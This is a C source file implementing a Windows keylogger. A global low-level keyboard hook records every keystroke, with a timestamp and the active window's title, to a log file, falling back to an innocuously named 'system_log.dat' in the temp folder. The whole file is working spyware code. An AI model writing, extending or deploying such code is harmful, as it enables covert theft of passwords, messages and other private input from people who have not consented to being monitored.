#include "hooks.h"
#include <stdio.h>
#include <time.h>
#include <windows.h>

static HHOOK hHook;
static FILE *logFile;
static int shiftPressed = 0;

static FILE *logFile = NULL;  // Initialize to NULL

void InitializeLogFile() {
    logFile = fopen("keylog.txt", "a+");
    if (!logFile) {
        // Handle error (could try creating in different location)
        char tempPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);
        strcat(tempPath, "system_log.dat");
        logFile = fopen(tempPath, "a+");
    }
}

void CleanupLogFile() {
    if (logFile) {
        fflush(logFile);
        fclose(logFile);
        logFile = NULL;
    }
}

char* GetActiveWindowTitle() {
    static char title[256];
    HWND hwnd = GetForegroundWindow();
    if (hwnd) {
        GetWindowTextA(hwnd, title, sizeof(title));
    } else {
        strcpy(title, "[Unknown Window]");
    }
    return title;
}


char getCharFromVK(DWORD vkCode) {
    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);

    UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
    WCHAR buffer[5];
    int result = ToUnicode(vkCode, scanCode, keyboardState, buffer, 4, 0);

    if (result == 1) {
        return (char)buffer[0];
    }
    return 0;
}

char* getTimestamp() {
    static char timeStr[64];
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    strftime(timeStr, sizeof(timeStr), "[%Y-%m-%d %H:%M:%S]", t);
    return timeStr;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    static int flushCounter = 0;
    const int FLUSH_INTERVAL = 10;  // Flush every 10 keystrokes
    
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;

        if (wParam == WM_KEYDOWN && 
            kbd->vkCode == 'K' && 
            (GetAsyncKeyState(VK_CONTROL) & 0x8000) &&
            (GetAsyncKeyState(VK_MENU) & 0x8000) &&
            (GetAsyncKeyState(VK_SHIFT) & 0x8000)) {
            StopKeyLogger();
            exit(0);
        }
        
        DWORD vkCode = kbd->vkCode;

        // Initialize file if not open
        if (!logFile) {
            InitializeLogFile();
            if (!logFile) return CallNextHookEx(hHook, nCode, wParam, lParam);
        }

        char ch = getCharFromVK(vkCode);
        
        // Write with timestamp and window title
        fprintf(logFile, "%s [%s] ", getTimestamp(), GetActiveWindowTitle());
        
        if (ch) {
            fprintf(logFile, "%c\n", ch);
        } else {
            char keyName[32];
            UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
            GetKeyNameTextA(scanCode << 16, keyName, sizeof(keyName));
            fprintf(logFile, "[%s]\n", keyName);
        }

        // Periodic flushing
        if (++flushCounter >= FLUSH_INTERVAL) {
            fflush(logFile);
            flushCounter = 0;
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void StartKeyLogger() {
    InitializeLogFile();  // Open file at start
    
    MSG msg;
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!hHook) {
        CleanupLogFile();
        return;
    }
    
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    CleanupLogFile();  // Close file on exit
}

void StopKeyLogger() {
    UnhookWindowsHookEx(hHook);
    CleanupLogFile();
}
